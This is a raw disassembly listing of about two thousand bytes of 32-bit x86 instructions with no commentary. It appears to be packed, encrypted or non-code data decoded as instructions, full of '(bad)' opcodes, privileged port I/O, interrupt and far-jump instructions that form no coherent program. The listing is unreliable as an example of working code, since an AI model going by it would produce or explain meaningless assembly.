  44c520:	or     DWORD PTR [ebx],ecx
  44c522:	mov    al,ds:0x7271b3d1
  44c527:	dec    edi
  44c528:	pop    ebp
  44c529:	mov    cs,WORD PTR [ebx-0x71]
  44c52c:	pop    edx
  44c52d:	sub    DWORD PTR [edi+0x4754a2ad],esi
  44c533:	scas   eax,DWORD PTR es:[edi]
  44c534:	pop    eax
  44c535:	mov    ebp,esi
  44c537:	and    ch,0x52
  44c53a:	lods   eax,DWORD PTR ds:[esi]
  44c53b:	mov    ds:0x8deee8a6,eax
  44c540:	sub    ebp,DWORD PTR [ecx+0x3e]
  44c543:	sub    DWORD PTR [edi],0xf0a113b4
  44c549:	xor    dl,0x56
  44c54c:	pop    ecx
  44c54d:	imul   esp,edi,0xffffff8a
  44c550:	pop    ebx
  44c551:	fadd   DWORD PTR [ecx]
  44c553:	in     eax,dx
  44c554:	cmp    al,BYTE PTR [ecx+0x4d61fcae]
  44c55a:	sub    BYTE PTR [eax+0x2820961e],dl
  44c560:	adc    ah,bl
  44c562:	ror    DWORD PTR es:[edx],0xee
  44c566:	and    al,ah
  44c568:	push   edx
  44c569:	push   ecx
  44c56a:	dec    ebx
  44c56b:	cmc    
  44c56c:	fiadd  WORD PTR [esp+ecx*1-0x66]
  44c570:	inc    esi
  44c571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c572:	sti    
  44c573:	stos   DWORD PTR es:[edi],eax
  44c574:	inc    edx
  44c575:	test   al,0xee
  44c577:	sbb    ecx,esi
  44c579:	and    edx,ebp
  44c57b:	mov    gs,WORD PTR [edi-0xb]
  44c57e:	out    dx,al
  44c57f:	iret   
  44c580:	and    ah,BYTE PTR [eax+0x2fac9fb6]
  44c586:	in     eax,dx
  44c587:	lahf   
  44c588:	ficomp WORD PTR [eax-0x43]
  44c58b:	mov    ds:0x9c8ebb24,al
  44c590:	cli    
  44c591:	scas   al,BYTE PTR es:[edi]
  44c592:	sti    
  44c593:	mov    ds:0x19ea795e,eax
  44c598:	fild   QWORD PTR [ebx+0x2da65ce9]
  44c59e:	pop    edi
  44c59f:	jmp    0xc89e:0xa9bb6154
  44c5a6:	mov    edx,0xde024cf7
  44c5ab:	into   
  44c5ac:	xor    DWORD PTR [ebx+ebx*1],eax
  44c5af:	mov    eax,ds:0xb12ade17
  44c5b4:	mov    al,ds:0xe3a20610
  44c5b9:	mov    eax,ds:0x3a8d2c49
  44c5be:	xor    eax,0xfa22be21
  44c5c3:	cmp    ebx,ebp
  44c5c5:	shl    BYTE PTR [ecx],0xa1
  44c5c8:	popf   
  44c5c9:	mov    edi,0x965fa4ef
  44c5ce:	jno    0x44c60b
  44c5d0:	pop    esi
  44c5d1:	shr    BYTE PTR [edx+edx*1+0x2e],cl
  44c5d5:	dec    esp
  44c5d6:	push   es
  44c5d7:	scas   al,BYTE PTR es:[edi]
  44c5d8:	call   0xd44c:0xefa1f460
  44c5df:	out    0x55,al
  44c5e1:	cli    
  44c5e2:	out    dx,al
  44c5e3:	xchg   BYTE PTR [esi-0x65],bh
  44c5e6:	mov    al,ds:0xbd5a1d74
  44c5eb:	mov    al,ds:0x490756e7
  44c5f0:	jnp    0x44c5a7
  44c5f2:	mov    al,ds:0xac45f25e
  44c5f8:	jmp    0xc168daaa
  44c5fd:	push   esp
  44c5fe:	push   eax
  44c5ff:	icebp  
  44c600:	mov    bl,0xce
  44c602:	int3   
  44c603:	mov    ebx,0x802da864
  44c608:	pop    ecx
  44c609:	mov    eax,ds:0x49570690
  44c60e:	jne    0x44c5bb
  44c610:	xor    eax,0x1a3d6e39
  44c615:	call   0x118cea2b
  44c61a:	loope  0x44c5dc
  44c61c:	pop    esi
  44c61d:	sahf   
  44c61e:	xor    al,0x84
  44c620:	xor    dh,BYTE PTR [edx+esi*8]
  44c623:	push   ebx
  44c624:	sbb    DWORD PTR [ecx-0x53],0xffffffb4
  44c628:	rol    BYTE PTR [ebp+0x28],1
  44c62b:	and    DWORD PTR [esi],edi
  44c62d:	out    0xd9,eax
  44c62f:	inc    eax
  44c630:	cmp    dl,BYTE PTR [edx+0x63]
  44c633:	adc    esp,DWORD PTR [ebx-0x5e]
  44c636:	mov    ch,0xfe
  44c638:	and    BYTE PTR [eax+0x61],ah
  44c63b:	test   al,0xe1
  44c63d:	aam    0x5a
  44c63f:	dec    ecx
  44c640:	push   edx
  44c641:	popa   
  44c642:	jl     0x44c5d6
  44c644:	pushf  
  44c645:	fucom  st(2)
  44c647:	out    dx,eax
  44c648:	pop    ds
  44c649:	outs   dx,DWORD PTR ds:[esi]
  44c64a:	call   DWORD PTR [edi+eax*2-0x2bb911a7]
  44c651:	adc    BYTE PTR [esp+esi*4-0x41da9e9e],al
  44c658:	sbb    ch,BYTE PTR ds:0x493d6373
  44c65e:	out    dx,al
  44c65f:	mov    ds:0x6888f197,eax
  44c664:	fnstsw WORD PTR [ebp-0x2c20720e]
  44c66a:	and    eax,0x92cf4fa1
  44c66f:	and    BYTE PTR [edx],bh
  44c671:	dec    edx
  44c672:	and    ebp,edi
  44c674:	mov    al,0x60
  44c676:	jo     0x44c65f
  44c678:	imul   edi,DWORD PTR [eax-0x4f],0x74
  44c67c:	or     eax,0x4e0f665e
  44c681:	out    dx,al
  44c682:	lods   al,BYTE PTR gs:[esi]
  44c684:	xchg   esi,eax
  44c685:	popa   
  44c686:	(bad)  
  44c688:	pop    esi
  44c689:	mul    BYTE PTR [edi]
  44c68b:	xor    ah,BYTE PTR [esi+ebx*1]
  44c68e:	cmp    al,0x1a
  44c690:	icebp  
  44c691:	pusha  
  44c692:	outs   dx,BYTE PTR ds:[esi]
  44c693:	es xchg edi,eax
  44c695:	sub    al,0xfa
  44c697:	stc    
  44c698:	frstor [esi+0x5253d1ee]
  44c69e:	jno    0x44c716
  44c6a0:	iret   
  44c6a1:	adc    al,0x1
  44c6a3:	nop
  44c6a4:	add    BYTE PTR es:[esi],0xa1
  44c6a8:	mov    edx,0x128d8baf
  44c6ad:	inc    esi
  44c6ae:	jmp    0x44c64d
  44c6b0:	scas   al,BYTE PTR es:[edi]
  44c6b1:	sbb    eax,0x8960ca7c
  44c6b6:	test   eax,0x7b61621b
  44c6bb:	pop    ss
  44c6bc:	or     DWORD PTR [edx],ebx
  44c6be:	and    eax,0x5e64e524
  44c6c3:	nop
  44c6c4:	pop    esi
  44c6c5:	icebp  
  44c6c6:	push   ebx
  44c6c7:	mov    bh,0xd2
  44c6c9:	cdq    
  44c6ca:	je     0x44c744
  44c6cc:	out    0x24,eax
  44c6ce:	cld    
  44c6cf:	mov    eax,ds:0xf77591d6
  44c6d4:	loope  0x44c6e2
  44c6d6:	sbb    al,0x85
  44c6d8:	pop    ebp
  44c6d9:	mov    gs,esi
  44c6db:	pop    ss
  44c6dc:	ss aad 0x12
  44c6df:	add    esi,DWORD PTR [ebx+0x5e]
  44c6e2:	push   ebx
  44c6e3:	test   al,0x54
  44c6e5:	lds    ecx,FWORD PTR [edx]
  44c6e7:	push   ecx
  44c6e8:	mov    esp,0x53c0ac70
  44c6ed:	and    eax,0xdb851aee
  44c6f2:	cld    
  44c6f3:	fsubr  QWORD PTR ds:0xe6a0beff
  44c6f9:	xchg   DWORD PTR ds:0x3f58a7da,esp
  44c6ff:	xchg   ecx,eax
  44c700:	pop    esi
  44c701:	inc    edx
  44c702:	imul   ebp,DWORD PTR [edx+0x5a],0xffffffbd
  44c706:	mov    esp,DWORD PTR [edx+ebx*1-0x64651e9f]
  44c70d:	cli    
  44c70e:	add    al,0x25
  44c710:	shr    DWORD PTR [ecx-0x15],cl
  44c713:	jnp    0x44c777
  44c715:	jnp    0x44c756
  44c717:	jg     0x44c756
  44c719:	mov    BYTE PTR [ebp-0x5c],dl
  44c71c:	cs sar dh,0xa0
  44c720:	dec    edx
  44c721:	inc    ecx
  44c722:	and    ebx,DWORD PTR [ecx-0x6993adf6]
  44c728:	pop    esi
  44c729:	aaa    
  44c72a:	pusha  
  44c72b:	arpl   WORD PTR [ebp-0x73],si
  44c72e:	jmp    0x44c712
  44c730:	pop    esp
  44c731:	popa   
  44c732:	push   ebx
  44c733:	dec    esi
  44c734:	inc    edi
  44c735:	sahf   
  44c736:	jle    0x44c7ac
  44c738:	out    0x87,eax
  44c73a:	push   esi
  44c73b:	bound  ebx,QWORD PTR [esi-0x61]
  44c73e:	dec    esi
  44c73f:	pop    esp
  44c740:	in     eax,0x56
  44c742:	mov    cl,0xb5
  44c744:	int    0x42
  44c746:	std    
  44c747:	pop    eax
  44c748:	jo     0x44c6e6
  44c74a:	jb     0x44c78c
  44c74c:	cli    
  44c74d:	loopne 0x44c76c
  44c74f:	push   ecx
  44c750:	dec    eax
  44c751:	mov    al,ds:0x597a7ae7
  44c756:	cmp    eax,0xb22d6eac
  44c75b:	mov    al,fs:0x2e957d52
  44c761:	out    0x4f,eax
  44c763:	jns    0x44c720
  44c765:	nop
  44c766:	adc    cl,ah
  44c768:	jmp    0x5edfa2fb
  44c76d:	les    edi,FWORD PTR [edx-0x46]
  44c770:	sbb    cl,BYTE PTR ds:0x63263d37
  44c776:	cmc    
  44c777:	mov    bl,0xde
  44c779:	jg     0x44c7ad
  44c77b:	mov    al,ds:0x1a859ed2
  44c780:	pop    esi
  44c781:	jne    0x44c7a2
  44c783:	(bad)  
  44c784:	loopne 0x44c7d5
  44c786:	push   ss
  44c787:	push   ds
  44c788:	jecxz  0x44c7ea
  44c78a:	fnstcw WORD PTR ss:[edx+0x16]
  44c78e:	imul   esi,DWORD PTR [ecx-0x1a11a280],0x4e
  44c795:	mov    eax,0x52933c60
  44c79a:	jns    0x44c80b
  44c79c:	inc    edi
  44c79d:	popa   
  44c79e:	sub    al,0xe0
  44c7a0:	jo     0x44c7ee
  44c7a2:	mov    ch,0xe9
  44c7a4:	inc    ebp
  44c7a5:	xchg   edi,eax
  44c7a6:	out    dx,eax
  44c7a7:	sbb    DWORD PTR [esi+edi*2],eax
  44c7aa:	jle    0x44c774
  44c7ac:	dec    esi
  44c7ad:	aad    0xbe
  44c7af:	fwait
  44c7b0:	loopne 0x44c761
  44c7b2:	stos   DWORD PTR es:[edi],eax
  44c7b3:	push   0x67126112
  44c7b8:	cs (bad) 
  44c7bb:	pop    eax
  44c7bc:	popf   
  44c7bd:	mov    bh,0xee
  44c7bf:	sbb    al,0x65
  44c7c1:	xchg   edi,eax
  44c7c2:	and    esi,DWORD PTR [edx-0x24]
  44c7c5:	sub    BYTE PTR [ecx-0x5c9f35cf],ah
  44c7cb:	sbb    ecx,DWORD PTR [eax-0x79]
  44c7ce:	xor    dh,dh
  44c7d0:	pop    edi
  44c7d1:	inc    ebx
  44c7d2:	jecxz  0x44c7f1
  44c7d4:	dec    edi
  44c7d5:	push   edx
  44c7d6:	in     al,dx
  44c7d7:	sbb    BYTE PTR [esi+0x55],0x82
  44c7db:	adc    eax,DWORD PTR [ebp+0x73]
  44c7de:	xchg   DWORD PTR [ecx+0x60678d85],esp
  44c7e4:	retf   
  44c7e5:	retf   0x842d
  44c7e8:	into   
  44c7e9:	mov    edi,0x97521ee
  44c7ee:	or     BYTE PTR [edi-0x5f09b987],dl
  44c7f4:	inc    eax
  44c7f5:	inc    ebp
  44c7f6:	push   edx
  44c7f7:	test   DWORD PTR es:[ebp+ebx*8+0x2a],edi
  44c7fc:	pop    edi
  44c7fd:	js     0x44c7f4
  44c7ff:	js     0x44c87b
  44c801:	adc    ebp,edi
  44c803:	or     BYTE PTR [edx-0x23],ch
  44c806:	cmp    al,0x7c
  44c808:	mov    al,ds:0xa525dd40
  44c80d:	pusha  
  44c80e:	out    dx,eax
  44c80f:	and    al,0x15
  44c811:	pop    ebp
  44c812:	cmp    DWORD PTR [eax],esi
  44c814:	int    0x1a
  44c816:	in     eax,dx
  44c817:	xchg   DWORD PTR [eax-0x3c],edx
  44c81a:	sub    al,0xdb
  44c81c:	lods   eax,DWORD PTR ds:[esi]
  44c81d:	push   edi
  44c81e:	push   edx
  44c81f:	fldenv [esi+0x62bc0659]
  44c825:	inc    ebp
  44c826:	lods   eax,DWORD PTR ds:[esi]
  44c827:	sub    al,0x4c
  44c82a:	and    al,0xa5
  44c82c:	pop    esi
  44c82d:	lds    esp,FWORD PTR ds:0xa100e570
  44c833:	sub    dl,al
  44c835:	pusha  
  44c836:	push   ebp
  44c837:	add    BYTE PTR [esi],cl
  44c839:	fiadd  WORD PTR [edi+0x76]
  44c83c:	push   ss
  44c83d:	jl     0x44c860
  44c83f:	or     DWORD PTR [eax+0x52],ebp
  44c842:	mov    ecx,0x2d7dce84
  44c847:	outs   dx,BYTE PTR ds:[esi]
  44c848:	ins    DWORD PTR es:[edi],dx
  44c849:	shl    BYTE PTR [edi+eiz*8],1
  44c84c:	lea    esp,[edi+0x12]
  44c84f:	(bad)  
  44c851:	push   ds
  44c852:	adc    esi,DWORD PTR [ecx-0xd04e322]
  44c858:	jo     0x44c8c8
  44c85a:	jmp    0x44c880
  44c85c:	push   edi
  44c85d:	inc    ecx
  44c85e:	sbb    BYTE PTR [edx],0x45
  44c861:	stc    
  44c862:	(bad)  
  44c863:	retf   
  44c864:	fstp   DWORD PTR [ebp-0x1c]
  44c867:	adc    al,0x1a
  44c869:	jl     0x44c8be
  44c86b:	out    dx,al
  44c86c:	xchg   BYTE PTR [ebx+ecx*1],cl
  44c86f:	add    DWORD PTR [esi+0x26],ebx
  44c872:	adc    ebp,DWORD PTR [ebp+0x1d5b09ce]
  44c878:	es mov bh,0xa9
  44c87b:	mov    al,ds:0x422a2854
  44c880:	cs fs xchg esp,eax
  44c883:	test   DWORD PTR [esi-0x2a],ebx
  44c886:	popa   
  44c887:	inc    ebp
  44c888:	call   0x52d69031
  44c88d:	popa   
  44c88e:	xor    esi,DWORD PTR [edx]
  44c890:	and    BYTE PTR [ecx-0x49],bh
  44c893:	outs   dx,DWORD PTR ds:[esi]
  44c894:	mov    al,ds:0x1c59ee6d
  44c899:	jl     0x44c8be
  44c89b:	bound  esp,QWORD PTR ds:0xf88f4de5
  44c8a1:	mov    ah,0xf3
  44c8a3:	cmp    edx,DWORD PTR [bx+di+0x6c]
  44c8a7:	ror    DWORD PTR [esi-0x7bc1d8b4],1
  44c8ad:	or     al,0xea
  44c8af:	sbb    BYTE PTR [eax],bh
  44c8b1:	adc    DWORD PTR [ecx+ebx*1+0x33fd7ade],ebp
  44c8b8:	or     esp,DWORD PTR [ecx+0x7d]
  44c8bb:	imul   edi,DWORD PTR ds:0xd530af7b,0x56
  44c8c2:	out    dx,al
  44c8c3:	or     DWORD PTR [eax+eax*8+0x58221dc2],0xfffffff3
  44c8cb:	enter  0x6d66,0xe7
  44c8cf:	ds jb  0x44c8ea
  44c8d2:	jmp    0x44c90a
  44c8d4:	test   DWORD PTR [edx],ecx
  44c8d6:	pop    edx
  44c8d7:	in     eax,0x5e
  44c8d9:	and    BYTE PTR [ebx+edx*4-0x75],0x4f
  44c8de:	xchg   esp,eax
  44c8df:	int    0xb6
  44c8e1:	pop    ebp
  44c8e2:	mov    ebp,0x36045ad2
  44c8e7:	mov    ebx,0x4ce5729d
  44c8ec:	fsubr  QWORD PTR [ebp-0x12]
  44c8ef:	sub    al,0x60
  44c8f1:	push   0x16
  44c8f3:	cs sub eax,0xa0a0ca57
  44c8f9:	mov    ch,0xd
  44c8fb:	or     eax,0x227691fd
  44c900:	pop    esi
  44c901:	jae    0x44c8f9
  44c903:	or     DWORD PTR [ebx],ebx
  44c905:	push   ecx
  44c906:	add    DWORD PTR [edi+0x41],esi
  44c909:	popa   
  44c90a:	inc    ecx
  44c90b:	jl     0x44c958
  44c90d:	pushf  
  44c90e:	push   ds
  44c90f:	sub    al,0x40
  44c911:	mov    esi,gs
  44c913:	adc    BYTE PTR [ecx-0x2a6b0923],dh
  44c919:	daa    
  44c91a:	stc    
  44c91b:	sahf   
  44c91c:	push   esp
  44c91d:	or     DWORD PTR [edi],edx
  44c91f:	mov    edi,0x7bf4837e
  44c924:	push   eax
  44c925:	xor    esi,ebp
  44c927:	repz pop edx
  44c929:	add    esi,DWORD PTR [ecx+0x21]
  44c92c:	pop    ds
  44c92d:	pusha  
  44c92e:	mov    WORD PTR [ebp+0x6215612e],?
  44c934:	jmp    0x685a3d35
  44c939:	loope  0x44c929
  44c93b:	push   0xffffff8f
  44c93d:	mov    ecx,0x7b5f8013
  44c942:	inc    ecx
  44c943:	or     DWORD PTR [esi],esp
  44c945:	popa   
  44c946:	cmc    
  44c947:	nop
  44c948:	pop    edx
  44c949:	jl     0x44c97c
  44c94b:	mov    DWORD PTR [edx-0xa6fff16],ebx
  44c951:	mov    dl,0x6b
  44c953:	push   cs
  44c954:	pop    ebx
  44c955:	push   ds
  44c956:	arpl   WORD PTR [ecx-0xe],si
  44c959:	pop    ebx
  44c95a:	pop    ecx
  44c95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c95c:	dec    edx
  44c95d:	jmp    0x996e:0x8c3e5b80
  44c964:	loope  0x44c92a
  44c966:	out    dx,al
  44c967:	fwait
  44c968:	sahf   
  44c969:	pop    edx
  44c96a:	xchg   ebx,eax
  44c96b:	inc    eax
  44c96c:	mov    edx,0x8ea0d10a
  44c971:	sub    eax,0x89d73612
  44c976:	or     eax,0xfc905d96
  44c97b:	repnz scas eax,DWORD PTR es:[edi]
  44c97d:	mov    edi,0xd73e7e6b
  44c982:	xchg   esp,eax
  44c983:	repnz mov BYTE PTR [ebp-0x1a],dl
  44c987:	loopne 0x44c9af
  44c989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c98a:	outs   dx,BYTE PTR ds:[esi]
  44c98b:	mov    BYTE PTR [esi+0x5e4cbe86],dh
  44c991:	and    esi,DWORD PTR [eax+esi*4]
  44c994:	lea    esp,[edi+0x615d867c]
  44c99a:	call   0x12a36b0a
  44c99f:	add    DWORD PTR [edx+ebp*8-0x19],esp
  44c9a3:	mov    al,0xf1
  44c9a5:	dec    ebp
  44c9a6:	cmp    esi,DWORD PTR [eax-0x1e4d2a92]
  44c9ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c9ad:	pop    ebx
  44c9ae:	push   cs
  44c9af:	mov    ds:0x21a2d6fb,al
  44c9b4:	icebp  
  44c9b5:	mov    ch,0xa9
  44c9b7:	pop    ss
  44c9b8:	aaa    
  44c9b9:	inc    esi
  44c9ba:	mov    dh,0x20
  44c9bc:	(bad)  
  44c9bd:	pop    esp
  44c9be:	jl     0x44ca25
  44c9c0:	(bad)  
  44c9c1:	(bad)  
  44c9c2:	adc    BYTE PTR [ecx-0x5ba99f73],al
  44c9c8:	and    DWORD PTR [ebp+0x5e],0xee9691f3
  44c9cf:	mov    dh,0xdc
  44c9d1:	sahf   
  44c9d2:	scas   al,BYTE PTR es:[edi]
  44c9d3:	jns    0x44c96c
  44c9d5:	cld    
  44c9d6:	cmp    eax,0x7624bea1
  44c9db:	popf   
  44c9dc:	loopne 0x44c9ab
  44c9de:	mov    ah,0x59
  44c9e0:	pop    esi
  44c9e1:	mov    esp,0x70f4c4ea
  44c9e6:	push   ebx
  44c9e7:	xchg   esi,eax
  44c9e8:	sub    ah,BYTE PTR [edi-0x28]
  44c9eb:	inc    ebp
  44c9ec:	addr16 inc edx
  44c9ee:	dec    esi
  44c9ef:	xlat   BYTE PTR ds:[ebx]
  44c9f0:	mov    DWORD PTR [eax+0x27],esp
  44c9f3:	sub    cl,ah
  44c9f5:	push   ebp
  44c9f6:	rol    BYTE PTR [ecx+0x74],cl
  44c9f9:	fmul   st(6),st
  44c9fb:	dec    ecx
  44c9fc:	cli    
  44c9fd:	stos   BYTE PTR es:[edi],al
  44c9fe:	imul   edx,DWORD PTR [ebx-0x5ee1eeac],0xffffffc6
  44ca05:	mov    dl,0x29
  44ca07:	outs   dx,BYTE PTR ds:[esi]
  44ca08:	inc    esi
  44ca09:	(bad)  
  44ca0a:	out    dx,al
  44ca0b:	mov    esi,0x45ea5352
  44ca10:	jbe    0x44c9b3
  44ca12:	dec    edx
  44ca13:	lahf   
  44ca14:	and    DWORD PTR [ecx-0x5b],ecx
  44ca17:	(bad)  
  44ca18:	pop    esi
  44ca19:	fisubr WORD PTR [ebx]
  44ca1b:	mov    ds:0xf7eeb837,eax
  44ca20:	es gs add eax,0xeba4479c
  44ca27:	mov    al,ds:0x98747fc0
  44ca2c:	push   ss
  44ca2d:	sbb    al,0x52
  44ca2f:	fcomp  QWORD PTR [esi+0x5c]
  44ca32:	jbe    0x44c9c9
  44ca34:	inc    ebp
  44ca35:	and    BYTE PTR [edi+0x609635a],ah
  44ca3b:	rcr    DWORD PTR [ebp+0x3b],1
  44ca3e:	shr    DWORD PTR [edx-0x20],0xb8
  44ca42:	jg     0x44ca35
  44ca44:	fld    st(4)
  44ca46:	add    DWORD PTR ds:0x7c2c478f,edx
  44ca4c:	mov    ch,0x7b
  44ca4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ca4f:	popa   
  44ca50:	pop    ecx
  44ca51:	push   ebp
  44ca52:	stc    
  44ca53:	mov    al,ds:0x6eedf4a2
  44ca58:	adc    BYTE PTR [ecx],0xfe
  44ca5b:	fwait
  44ca5c:	pusha  
  44ca5d:	or     BYTE PTR [edi+0x3e6cf63e],dh
  44ca63:	add    DWORD PTR [eax+0x5c],edi
  44ca66:	test   DWORD PTR [ecx-0x2418a84b],esp
  44ca6c:	imul   esp,DWORD PTR [edi+0x565ea6a0],0xffffff86
  44ca73:	jge    0x44cab7
  44ca75:	aaa    
  44ca76:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  44ca78:	push   es
  44ca79:	popa   
  44ca7a:	sbb    edx,DWORD PTR [ecx-0x531768b5]
  44ca80:	sahf   
  44ca81:	(bad)  
  44ca82:	in     eax,dx
  44ca83:	ja     0x44caf9
  44ca85:	mov    DWORD PTR [edx-0x22bb7d78],edi
  44ca8b:	and    DWORD PTR [esi-0x1a],esi
  44ca8e:	xor    eax,0xe167eea1
  44ca93:	mov    eax,ds:0x98abd63e
  44ca98:	pop    esi
  44ca99:	loopne 0x44cac7
  44ca9b:	scas   al,BYTE PTR es:[edi]
  44ca9c:	lock add al,0x7
  44ca9f:	lea    edx,[eax]
  44caa1:	push   edx
  44caa2:	aam    0xa2
  44caa4:	jae    0x44ca36
  44caa6:	dec    esi
  44caa7:	mov    eax,0xdf86e99a
  44caac:	pop    esi
  44caad:	mov    eax,0x2f0cd23a
  44cab2:	mov    esp,0xef5d866c
  44cab7:	and    ebx,DWORD PTR [ebx-0x59b548a9]
  44cabd:	pop    eax
  44cabe:	call   0x451b:0x1ac25b4c
  44cac5:	stos   BYTE PTR es:[edi],al
  44cac6:	mov    ds,WORD PTR ds:0xa89e5527
  44cacc:	(bad)  
  44cace:	and    ch,cl
  44cad0:	or     DWORD PTR [ecx-0x65352fc3],esi
  44cad6:	out    dx,al
  44cad7:	push   cs
  44cad8:	sbb    cl,al
  44cada:	(bad)  
  44cadb:	mov    bh,0xa0
  44cadd:	push   esp
  44cade:	push   ecx
  44cadf:	mov    ds:0x4599115a,al
  44cae4:	popf   
  44cae5:	and    BYTE PTR [ebp-0x7b782f4f],bh
  44caeb:	jne    0x44cb2f
  44caed:	inc    ebx
  44caee:	out    dx,al
  44caef:	test   al,0x5d
  44caf1:	mov    cl,0x97
  44caf3:	icebp  
  44caf4:	cmp    DWORD PTR [bp+si-0x5f],ebx
  44caf8:	push   cx
  44cafa:	dec    ebx
  44cafb:	adc    DWORD PTR ds:0x5e34051d,ebx
  44cb01:	add    eax,0x2684518
  44cb06:	push   es
  44cb07:	sbb    ebx,ecx
  44cb09:	pop    edi
  44cb0a:	or     al,0xb5
  44cb0c:	lods   eax,DWORD PTR ds:[esi]
  44cb0d:	in     eax,0x7a
  44cb0f:	(bad)
  44cb12:	mov    gs,WORD PTR [ebx+0x5a]
  44cb15:	pushf  
  44cb16:	scas   al,BYTE PTR es:[edi]
  44cb17:	jo     0x44cb35
  44cb19:	jle    0x44cb49
  44cb1b:	js     0x44cb79
  44cb1d:	pop    eax
  44cb1e:	mov    DWORD PTR [ecx],esi
  44cb20:	pop    edx
  44cb21:	add    eax,0xd935dade
  44cb26:	out    dx,al
  44cb27:	shl    BYTE PTR [eax],0x68
  44cb2a:	dec    esp
  44cb2b:	jmp    0xa0d7:0x8cf0cc56
  44cb32:	push   ds
  44cb33:	add    esp,eax
  44cb35:	dec    esp
  44cb36:	test   BYTE PTR [eax-0x5b6d52d1],0xde
  44cb3d:	enter  0x7301,0xf0
  44cb41:	sahf   
  44cb42:	inc    esi
  44cb43:	shl    DWORD PTR [edx],1
  44cb45:	pop    ebx
  44cb46:	sub    bh,BYTE PTR [edi-0x17d11cc4]
  44cb4c:	idiv   BYTE PTR ds:0xd11ea17f
  44cb52:	sbb    eax,0xed4a9ef9
  44cb57:	retf   0x495e
  44cb5a:	add    bh,bl
  44cb5c:	add    BYTE PTR [edx+ebp*8],cl
  44cb5f:	lahf   
  44cb60:	ds inc edx
  44cb62:	or     eax,0x26e10cca
  44cb67:	mov    ebx,0xa26788af
  44cb6c:	jp     0x44cbcc
  44cb6e:	loop   0x44cbe8
  44cb70:	pop    esi
  44cb71:	pop    ecx
  44cb72:	dec    edx
  44cb73:	xchg   ebp,eax
  44cb74:	into   
  44cb75:	pop    esp
  44cb76:	mov    ebx,0xc630cd7
  44cb7b:	(bad)  
  44cb7c:	pop    esi
  44cb7d:	rol    ecx,0x9c
  44cb80:	fnsave [ebx-0x2aa16c4e]
  44cb86:	jno    0x44cb39
  44cb88:	test   eax,0x1c1bf11d
  44cb8d:	daa    
  44cb8e:	bound  esp,QWORD PTR [ecx-0x72155f21]
  44cb94:	test   al,0xe4
  44cb96:	mov    eax,ds:0xb8c25b4f
  44cb9b:	cwde   
  44cb9c:	shr    BYTE PTR [edx],1
  44cb9e:	in     eax,dx
  44cb9f:	or     esi,DWORD PTR [eax-0x2d]
  44cba2:	push   edx
  44cba3:	rcl    BYTE PTR [ebx+0x61],0x29
  44cba7:	mov    bl,0xc1
  44cba9:	cmc    
  44cbaa:	push   cs
  44cbab:	mov    ds:0xebe7ddce,eax
  44cbb0:	dec    edi
  44cbb1:	sbb    ebp,ebp
  44cbb3:	hlt    
  44cbb4:	ds rcr bl,cl
  44cbb7:	in     al,0xd9
  44cbb9:	pusha  
  44cbba:	pop    eax
  44cbbb:	dec    ebp
  44cbbc:	fs call 0x1b248f93
  44cbc2:	adc    ecx,0x158655c2
  44cbc8:	push   ss
  44cbc9:	scas   al,BYTE PTR es:[edi]
  44cbca:	addr16 call 0x725d:0x1f0310a6
  44cbd2:	out    dx,al
  44cbd3:	out    0x3,al
  44cbd5:	pop    ebp
  44cbd6:	call   0x5fe758e3
  44cbdb:	test   al,0xfd
  44cbdd:	inc    edx
  44cbde:	add    dl,dl
  44cbe0:	xchg   BYTE PTR [eax+0x5fce507a],dl
  44cbe6:	out    dx,al
  44cbe7:	pusha  
  44cbe8:	out    0x12,eax
  44cbea:	adc    bl,BYTE PTR [edx]
  44cbec:	loope  0x44cc2c
  44cbee:	adc    esp,DWORD PTR [ecx+0x6ae3727]
  44cbf4:	sbb    BYTE PTR [di-0x417e],bh
  44cbf9:	out    0x17,al
  44cbfb:	ret    0xd85e
  44cbfe:	imul   eax,DWORD PTR [edx],0x78b8543b
  44cc04:	ins    BYTE PTR es:[edi],dx
  44cc05:	pop    edi
  44cc06:	sbb    DWORD PTR [edx-0x715ed11a],ebx
  44cc0c:	pop    ebx
  44cc0d:	test   eax,0x6b5ea02e
  44cc12:	jp     0x44cc76
  44cc14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cc15:	js     0x44cbc5
  44cc17:	xor    DWORD PTR [edx+0x61],esp
  44cc1a:	mov    ecx,0x870e66a2
  44cc1f:	(bad)  
  44cc21:	ins    BYTE PTR es:[edi],dx
  44cc22:	jmp    0x44cc78
  44cc24:	xchg   DWORD PTR [ebp+esi*8-0x333f935d],ebp
  44cc2b:	sar    DWORD PTR [eax],1
  44cc2d:	pop    edi
  44cc2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cc2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cc30:	bound  esi,QWORD PTR [ebx]
  44cc32:	fisub  DWORD PTR [ebp+0x3b5e60f3]
  44cc38:	pop    eax
  44cc39:	sbb    esi,DWORD PTR [ecx]
  44cc3b:	mov    eax,ds:0x5af1f2e1
  44cc40:	sbb    ch,BYTE PTR [esp+esi*2]
  44cc43:	adc    dl,BYTE PTR [edx]
  44cc45:	and    DWORD PTR [bx+di-0x55bf],0xe134d82d
  44cc4e:	fisub  DWORD PTR [eax-0x7d92f09b]
  44cc54:	jle    0x44cbe2
  44cc56:	(bad)  
  44cc58:	pop    ecx
  44cc59:	dec    eax
  44cc5a:	jno    0x44cc82
  44cc5c:	pop    ebx
  44cc5d:	jo     0x44cc8d
  44cc5f:	mov    BYTE PTR [edx+eiz*2-0x1],ah
  44cc63:	stos   DWORD PTR es:[edi],eax
  44cc64:	mov    esi,0x3cdd6bd7
  44cc69:	inc    esp
  44cc6a:	jle    0x44cc12
  44cc6c:	xchg   ebp,eax
  44cc6d:	pop    eax
  44cc6e:	jmp    0x44cc1b
  44cc70:	outs   dx,BYTE PTR ds:[esi]
  44cc71:	mov    edx,0x8f33a1bc
  44cc76:	arpl   WORD PTR [ebx-0x173528],bx
  44cc7c:	fsubrp st(1),st
  44cc7e:	push   ss
  44cc7f:	es (bad) 
  44cc81:	pusha  
  44cc82:	add    ah,BYTE PTR [edi]
  44cc84:	sahf   
  44cc85:	cmp    BYTE PTR [esi-0x13af994f],dh
  44cc8b:	jnp    0x44cc9a
